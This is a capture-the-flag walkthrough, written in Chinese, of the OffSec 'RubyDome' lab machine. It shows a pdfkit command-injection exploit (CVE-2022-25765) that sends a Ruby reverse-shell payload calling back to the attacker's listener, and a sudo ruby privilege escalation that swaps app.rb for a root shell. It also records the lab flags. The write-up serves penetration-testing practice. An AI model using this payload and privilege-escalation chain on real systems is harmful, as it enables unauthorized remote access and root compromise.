###### tags: `Offsec` `PG Practice` `Easy` `Linux`

# RubyDome
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rustscan -a 192.168.166.22 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 192.168.166.22:22
Open 192.168.166.22:3000

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
3000/tcp open  http    syn-ack WEBrick httpd 1.7.0 (Ruby 3.0.2 (2021-07-07))
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: WEBrick/1.7.0 (Ruby/3.0.2/2021-07-07)
|_http-title: Ruby
Dome HTML to PDF
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

搜尋找到[edb-51293](https://www.exploit-db.com/exploits/51293)
```
┌──(kali㉿kali)-[~/pgplay]
└─$ searchsploit -m 51293

┌──(kali㉿kali)-[~/pgplay]
└─$ rlwrap -cAr nc -nvlp9001

┌──(kali㉿kali)-[~/pgplay]
└─$ python3 51293.py -s 192.168.45.244 9001 -w http://192.168.166.22:3000/pdf -p url

UNICORD: Exploit for CVE-2022–25765 (pdfkit) - Command Injection
OPTIONS: Reverse Shell Sent to Target Website Mode
PAYLOAD: http://%20`ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("192.168.45.244","9001"))'`
LOCALIP: 192.168.45.244:9001
WARNING: Be sure to start a local listener on the above IP and port. "nc -lnvp 9001".
WEBSITE: http://192.168.166.22:3000/pdf
POSTARG: url
EXPLOIT: Payload sent to website!
SUCCESS: Exploit performed action.
```

等反彈，在`/home/andrew`拿到local.txt
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
andrew@rubydome:~$ cat local.txt
300a8662b196e5c140902a7bc85bde77
```

查看`sudo -l`，有個`app.rb`可以直接用root
```
andrew@rubydome:~/app$ sudo -l
Matching Defaults entries for andrew on rubydome:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User andrew may run the following commands on rubydome:
    (ALL) NOPASSWD: /usr/bin/ruby /home/andrew/app/app.rb
```

先把`app.rb`移走，再參考[GTFOBins](https://gtfobins.github.io/gtfobins/ruby/#shell)，之後執行檔案就可以得到root
```
andrew@rubydome:~/app$ mv app.rb app_1.rb
andrew@rubydome:~/app$ echo 'exec "/bin/sh"' > app.rb
andrew@rubydome:~/app$ cat app.rb
exec "/bin/sh"

andrew@rubydome:~/app$ sudo /usr/bin/ruby /home/andrew/app/app.rb
sudo /usr/bin/ruby /home/andrew/app/app.rb
# whoami
root
```

在/root路徑可以得到proof.txt
```
# cat proof.txt
cat proof.txt
0eda9a2dd704fa77b041416914710985
```
